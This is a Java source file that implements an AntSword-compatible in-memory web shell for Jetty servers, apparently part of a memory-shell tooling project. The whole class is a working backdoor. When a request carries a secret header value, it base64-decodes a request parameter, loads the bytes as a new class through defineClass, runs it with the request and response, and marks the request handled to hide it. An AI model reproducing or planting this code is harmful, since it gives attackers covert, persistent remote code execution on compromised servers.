package com.reajason.javaweb.memshell.shelltool.antsword;

/**
 * @author ReaJason
 */
public class AntSwordJettyHandler extends ClassLoader {

    public static String pass;
    public static String headerName;
    public static String headerValue;

    public AntSwordJettyHandler() {
    }

    public AntSwordJettyHandler(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object baseRequest = null;
        Object request = null;
        Object response = null;
        if (args.length == 4) {
            Object arg4 = args[3];
            baseRequest = args[1];
            if (arg4 instanceof Integer) {
                // jetty6
                request = args[1];
                response = args[2];
            } else {
                request = args[2];
                response = args[3];
            }
        } else {
            // ee10
            request = args[0];
            response = args[1];
        }
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] bytes = base64Decode(parameter);
                Object instance = (new AntSwordJettyHandler(Thread.currentThread().getContextClassLoader())).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(new Object[]{request, response});
                if (baseRequest != null) {
                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                }
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }
}